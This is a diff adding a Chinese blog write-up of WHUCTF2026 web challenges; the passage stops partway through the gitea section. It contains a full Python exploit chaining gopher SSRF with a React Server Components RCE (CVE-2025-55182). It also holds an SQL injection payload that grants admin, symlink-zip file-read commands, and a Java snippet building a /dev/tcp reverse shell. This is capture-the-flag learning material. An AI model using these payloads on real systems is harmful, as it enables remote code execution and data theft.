@@ -1,0 +1,829 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/blank.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="blank">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="web的部分题解，随着复现进度更新,没标记solved是赛后出的 Hell City[solved]初步测试发现是拼接url访问目的地址  手动探测，文件目录如图，根据这个提示我猜测真正的入口在另一个端口，然后要利用非常一点的协议，根据之前复现熔烬裂谷的经验初步推测是gopher 入口在80端口，协议是gopher,构造payload  入口确认: 可稳定访问 127.0.0.1:80，返回 Ne">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WHUCTF2026">
+<meta property="og:url" content="https://b1ank799.github.io/2026/04/29/WHUCTF2026/index.html">
+<meta property="og:site_name" content="blank">
+<meta property="og:description" content="web的部分题解，随着复现进度更新,没标记solved是赛后出的 Hell City[solved]初步测试发现是拼接url访问目的地址  手动探测，文件目录如图，根据这个提示我猜测真正的入口在另一个端口，然后要利用非常一点的协议，根据之前复现熔烬裂谷的经验初步推测是gopher 入口在80端口，协议是gopher,构造payload  入口确认: 可稳定访问 127.0.0.1:80，返回 Ne">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MGZhMTY0ZjVlZjJhNzI3ODE2ZGI4MWIwN2Y5NmVlMzJfYldFendhV0J1ZzRsMTlseThUT2tCQm13andzV1Z1VXZfVG9rZW46UmRocmJtN01ob2JBMFl4eE05SWMzd2NJbjhlXzE3Nzc0NTEwNzY6MTc3NzQ1NDY3Nl9WNA">
+<meta property="og:image" content="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmM1ZGJlMjUxZDRlMmNhNjJhMjU1NzJhZTY0NTdjZTlfNElmOG1rTW1RRzA1dzNmb01SaU1lN3BlR0F2RlFnM3dfVG9rZW46WDhiYmJyenNWb1FMZ1Z4ckhSd2NnY3k4bkJoXzE3Nzc0NDk5NjA6MTc3NzQ1MzU2MF9WNA">
+<meta property="article:published_time" content="2026-04-29T08:06:29.000Z">
+<meta property="article:modified_time" content="2026-04-29T08:24:42.423Z">
+<meta property="article:author" content="blank">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MGZhMTY0ZjVlZjJhNzI3ODE2ZGI4MWIwN2Y5NmVlMzJfYldFendhV0J1ZzRsMTlseThUT2tCQm13andzV1Z1VXZfVG9rZW46UmRocmJtN01ob2JBMFl4eE05SWMzd2NJbjhlXzE3Nzc0NTEwNzY6MTc3NzQ1NDY3Nl9WNA">
+  
+  
+  
+  <title>WHUCTF2026 - blank</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"b1ank799.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>blank</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="WHUCTF2026"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-29 16:06" pubdate>
+          April 29, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          58 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">WHUCTF2026</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>web的部分题解，随着复现进度更新,没标记solved是赛后出的</p>
+<h2 id="Hell-City-solved"><a href="#Hell-City-solved" class="headerlink" title="Hell City[solved]"></a>Hell City[solved]</h2><p>初步测试发现是拼接url访问目的地址</p>
+<p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MGZhMTY0ZjVlZjJhNzI3ODE2ZGI4MWIwN2Y5NmVlMzJfYldFendhV0J1ZzRsMTlseThUT2tCQm13andzV1Z1VXZfVG9rZW46UmRocmJtN01ob2JBMFl4eE05SWMzd2NJbjhlXzE3Nzc0NTEwNzY6MTc3NzQ1NDY3Nl9WNA" srcset="/img/loading.gif" lazyload></p>
+<p>手动探测，文件目录如图，根据这个提示我猜测真正的入口在另一个端口，然后要利用非常一点的协议，根据之前复现熔烬裂谷的经验初步推测是gopher</p>
+<p>入口在80端口，协议是gopher,构造payload</p>
+<ol>
+<li>入口确认: 可稳定访问 127.0.0.1:80，返回 Next.js 页面，确认目标是 Next/React 服务。</li>
+<li>漏洞方向定位: 根据 hint CVE-2025-55182，切到 React Server Components / Server Action 反序列化利用链</li>
+<li>触发方式确定: 使用 gopher:// 发送 multipart/form-data 的 POST，构造 0/1/2 三段字段，让_response._prefix 在服务端执行命令。</li>
+<li>回显方式修正: 普通 throw Error(…) 只得到哈希digest（无明文）。改成抛 NEXT_REDIRECT：把命令结果塞进digest，由响应头 x-action-redirect 明文带出。</li>
+<li>命令验证: 先 id 验证 RCE，再改 cat /flag，从 x-action-redirect 解码得到 flag。</li>
+</ol>
+<p>最终exp:执行：<code>python3 gopher.py --cmd "cat /flag"</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_js_payload</span>(<span class="hljs-params">cmd: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-comment"># Use NEXT_REDIRECT digest to exfiltrate command output in response</span><br>    <span class="hljs-keyword">return</span> (<br>        <span class="hljs-string">"var o=process.mainModule.require('child_process').execSync("</span><br>        + json.dumps(cmd)<br>        + <span class="hljs-string">").toString().trim();"</span><br>          <span class="hljs-string">"throw Object.assign(new Error('NEXT_REDIRECT'),"</span><br>          <span class="hljs-string">"{digest:'NEXT_REDIRECT;push;/' + encodeURIComponent(o) + ';307;'});"</span><br>    )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_body</span>(<span class="hljs-params">boundary: <span class="hljs-built_in">str</span>, cmd: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    obj0 = {<br>        <span class="hljs-string">"then"</span>: <span class="hljs-string">"$1:__proto__:then"</span>,<br>        <span class="hljs-string">"status"</span>: <span class="hljs-string">"resolved_model"</span>,<br>        <span class="hljs-string">"reason"</span>: -<span class="hljs-number">1</span>,<br>        <span class="hljs-string">"value"</span>: <span class="hljs-string">"{\"then\":\"$B0\"}"</span>,<br>        <span class="hljs-string">"_response"</span>: {<br>            <span class="hljs-string">"_prefix"</span>: build_js_payload(cmd),<br>            <span class="hljs-string">"_chunks"</span>: <span class="hljs-string">"$Q2"</span>,<br>            <span class="hljs-string">"_formData"</span>: {<span class="hljs-string">"get"</span>: <span class="hljs-string">"$1:constructor:constructor"</span>},<br>        },<br>    }<br><br>    fields = [<br>        (<span class="hljs-string">"0"</span>, json.dumps(obj0, separators=(<span class="hljs-string">","</span>, <span class="hljs-string">":"</span>))),<br>        (<span class="hljs-string">"1"</span>, <span class="hljs-string">"\"$@0\""</span>),<br>        (<span class="hljs-string">"2"</span>, <span class="hljs-string">"[]"</span>),<br>    ]<br><br>    parts = []<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> fields:<br>        parts.append(<span class="hljs-string">f"--<span class="hljs-subst">{boundary}</span>\r\n"</span>)<br>        parts.append(<span class="hljs-string">f"Content-Disposition: form-data; name=\"<span class="hljs-subst">{k}</span>\"\r\n\r\n"</span>)<br>        parts.append(<span class="hljs-string">f"<span class="hljs-subst">{v}</span>\r\n"</span>)<br>    parts.append(<span class="hljs-string">f"--<span class="hljs-subst">{boundary}</span>--\r\n"</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>.join(parts)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_request</span>(<span class="hljs-params">host: <span class="hljs-built_in">str</span>, path: <span class="hljs-built_in">str</span>, boundary: <span class="hljs-built_in">str</span>, body: <span class="hljs-built_in">str</span>, next_action: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> (<br>        <span class="hljs-string">f"POST <span class="hljs-subst">{path}</span> HTTP/1.1\r\n"</span><br>        <span class="hljs-string">f"Host: <span class="hljs-subst">{host}</span>\r\n"</span><br>        <span class="hljs-string">f"Next-Action: <span class="hljs-subst">{next_action}</span>\r\n"</span><br>        <span class="hljs-string">f"Content-Type: multipart/form-data; boundary=<span class="hljs-subst">{boundary}</span>\r\n"</span><br>        <span class="hljs-string">f"Content-Length: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(body.encode())}</span>\r\n"</span><br>        <span class="hljs-string">"Connection: close\r\n\r\n"</span><br>        <span class="hljs-string">f"<span class="hljs-subst">{body}</span>"</span><br>    )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_gopher_url</span>(<span class="hljs-params">host: <span class="hljs-built_in">str</span>, port: <span class="hljs-built_in">int</span>, req: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f"gopher://<span class="hljs-subst">{host}</span>:<span class="hljs-subst">{port}</span>/_"</span> + quote(req, safe=<span class="hljs-string">""</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_args</span>() -&gt; argparse.Namespace:<br>    parser = argparse.ArgumentParser(<br>        description=<span class="hljs-string">"Build gopher SSRF payload for Next/React multipart Server Action POST"</span><br>    )<br>    parser.add_argument(<span class="hljs-string">"--host"</span>, default=<span class="hljs-string">"127.0.0.1"</span>)<br>    parser.add_argument(<span class="hljs-string">"--port"</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">80</span>)<br>    parser.add_argument(<span class="hljs-string">"--path"</span>, default=<span class="hljs-string">"/"</span>)<br>    parser.add_argument(<span class="hljs-string">"--boundary"</span>, default=<span class="hljs-string">"----x"</span>)<br>    parser.add_argument(<span class="hljs-string">"--next-action"</span>, dest=<span class="hljs-string">"next_action"</span>, default=<span class="hljs-string">"x"</span>)<br>    parser.add_argument(<span class="hljs-string">"--cmd"</span>, default=<span class="hljs-string">"id"</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">"RCE command, test with id then switch to cat /flag"</span>)<br>    parser.add_argument(<br>        <span class="hljs-string">"--all-paths"</span>,<br>        action=<span class="hljs-string">"store_true"</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">"print payloads for /, /_next/action, /flag, /api/flag"</span>,<br>    )<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-literal">None</span>:<br>    args = parse_args()<br><br>    paths = [args.path]<br>    <span class="hljs-keyword">if</span> args.all_paths:<br>        paths = [<span class="hljs-string">"/"</span>, <span class="hljs-string">"/_next/action"</span>, <span class="hljs-string">"/flag"</span>, <span class="hljs-string">"/api/flag"</span>]<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> paths:<br>        body = build_body(args.boundary, args.cmd)<br>        req = build_request(args.host, p, args.boundary, body, args.next_action)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"# path=<span class="hljs-subst">{p}</span> cmd=<span class="hljs-subst">{args.cmd}</span>"</span>)<br>        <span class="hljs-built_in">print</span>(build_gopher_url(args.host, args.port, req))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmM1ZGJlMjUxZDRlMmNhNjJhMjU1NzJhZTY0NTdjZTlfNElmOG1rTW1RRzA1dzNmb01SaU1lN3BlR0F2RlFnM3dfVG9rZW46WDhiYmJyenNWb1FMZ1Z4ckhSd2NnY3k4bkJoXzE3Nzc0NDk5NjA6MTc3NzQ1MzU2MF9WNA" srcset="/img/loading.gif" lazyload></p>
+<p>手一直在抖看其他web手都出其他题目了我还在这题上面卡</p>
+<p>WHUCTF{WeIcom3_7o_7h3_HEIL_7bbc86423c8c}</p>
+<p>拿到hint以后的无明文回显和最终的exp构造由AI完成</p>
+<h2 id="注注need-solved"><a href="#注注need-solved" class="headerlink" title="注注need[solved]"></a>注注need[solved]</h2><p>果咩，纯人工以及感谢ika的指导……</p>
+<p>python flask框架用file读取/app/app.py，源码中找到账号密码。登陆查看flag</p>
+<h2 id="注注need-revenge-solved"><a href="#注注need-revenge-solved" class="headerlink" title="注注need_revenge[solved]"></a>注注need_revenge[solved]</h2><p>同读取源码，然后可以发现在登录中是可以sql查询的，但是直接登陆进行sql的概率比较低</p>
+<p>这时发现UPDATE模块修改通过的nickname等简介板块可以set,尝试修改</p>
+<p>‘, role=’admin’ WHERE username=’1’; –</p>
+<p>如果修改成功就可以重新登陆了这时进入1(admin)账号（这是个非预期）</p>
+<p>然后进入admin账号利用zip上传解压图片，但是很明显flag被ban了，但是根据读源码的提示，是可以被html的标签带出资源的</p>
+<p>在 Linux系统中，软链接（Symbolic Link） 是一种特殊的文件或目录，它指向另一个文件或目录。通过软链接，可以方便地访问目标文件或目录，而无需复制实际内容。</p>
+<p>所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Plain">ln -s /flag flag_link.jpg（🔗向flag）<br>zip --symlinks exploit.zip flag_link.jpg<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Plain">curl -s -b 'session=.eJwtj00OgjAUhO_yVpoQobSlFg9DXn_QKhRCiy4Id7dadpNvJjOZDdZgl84ZaOsi6-BxDo8pQrsBvjHiAi2UIWJ0uswglP-ksT2uQ-wyvDznOxSg3JTyYbB2PjXV-ZaQHdENCSZ5DHmnXx5Hm-GMIXymJVlgiOaUVpwozowy-sp6KitJTc9qRRtBKtEIqrS8okCUvOEGmZZW1UxoJCy1LdPw60UzOg_50zFFYN-_SxxLOw.aeRTcQ.m_cXewT2kf6cY5HIWnFmgkYBTis' \<br>  http://127.0.0.1:43401/images/flag_link.jpg<br></code></pre></td></tr></table></figure>
+
+<p>这里用curl+session是因为我直接访问没看到，所以用session curl带出</p>
+<p>WHUCTF{1eT_uS_0RdeR_A_R46blt_bd35bf401724}</p>
+<p>软链接部分是DeepSeek老师提供的思路</p>
+<h2 id="Nespresso-solved"><a href="#Nespresso-solved" class="headerlink" title="Nespresso[solved]"></a>Nespresso[solved]</h2><p>将jar包反编译得到一个jar项目，抛开spring框架查看源码</p>
+<p>1.攻击点在/serve的payload参数，base64字节流通过解码触发readobject();</p>
+<p>2.继续看发现有黑名单限制：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">(<span class="hljs-title class_">CoffeeObjectInputStream</span>.<span class="hljs-property">BLACKLIST</span> = (<span class="hljs-title class_">ArrayList</span>&lt;<span class="hljs-title class_">String</span>&gt;)<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>()).<span class="hljs-title function_">add</span>((<span class="hljs-title class_">Object</span>)<span class="hljs-string">"java.swing"</span>);<br>        <span class="hljs-title class_">CoffeeObjectInputStream</span>.<span class="hljs-property">BLACKLIST</span>.<span class="hljs-title function_">add</span>((<span class="hljs-title class_">Object</span>)<span class="hljs-string">"java.security"</span>);<br>        <span class="hljs-title class_">CoffeeObjectInputStream</span>.<span class="hljs-property">BLACKLIST</span>.<span class="hljs-title function_">add</span>((<span class="hljs-title class_">Object</span>)<span class="hljs-string">"org.spingframework.aop.target"</span>);<br></code></pre></td></tr></table></figure>
+
+<p>org.spingframework.aop.target</p>
+<p>我们不难发现，这个springframework写错了，写成了sping,好的所以应该使用spring链</p>
+<p>根据hint:题目环境为JDK17，本题出网，无需内存马</p>
+<p>于是进行一些信息搜集</p>
+<p>只要在浏览器中输入：JDK17spring反序列化链，第一篇就是参考blog（（（</p>
+<p><a target="_blank" rel="noopener" href="https://curlysean.github.io/2025/08/31/%E9%AB%98%E7%89%88%E6%9C%ACJDKSpring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">https://curlysean.github.io/2025/08/31/%E9%AB%98%E7%89%88%E6%9C%ACJDKSpring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</a></p>
+<p>但是注意到出网，所以需要一些反弹shell的工作，我们可以把原blog里的poc的string block调整为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> <span class="hljs-string">"127.0.0.1"</span>;    <span class="hljs-comment">//  IP</span><br><span class="hljs-type">String</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-string">"4444"</span>;            <span class="hljs-comment">//端口</span><br>        <br><span class="hljs-comment">// 构造命令数组：/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1"</span><br><span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">"String[] cmd = {\"/bin/bash\", \"-c\", \"/bin/bash -i &gt;&amp; /dev/tcp/"</span> + ip + <span class="hljs-string">"/"</span> + port + <span class="hljs-string">" 0&gt;&amp;1\"};"</span> +<br>                       <span class="hljs-string">"Runtime.getRuntime().exec(cmd);"</span><br></code></pre></td></tr></table></figure>
+
+<p>需要把本机的jdk版本切换为17,然后进行编译运行，以及要下载一堆jar…….</p>
+<p>最终通过反弹shell获取flag，虽然我本地没通但是出题人那边通了，也不知道为什么……交流后还是把分给我了，感到很内疚…….</p>
+<h2 id="gitea"><a href="#gitea" class="headerlink" title="gitea"></a>gitea</h2><p>gitea1.25版本的容器，一直没什么思路，赛后和一些师傅们交流发现是个0day的洞。<br>根据hint先进行登陆，然后通过/sec/sec/issues/new?template=README.md越权读取，之后继续读取admin账号密码进行登陆。<br>接下来是利用gitea的hook漏洞,将post-receive钩子修改如下（这是AI搓的果咩</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 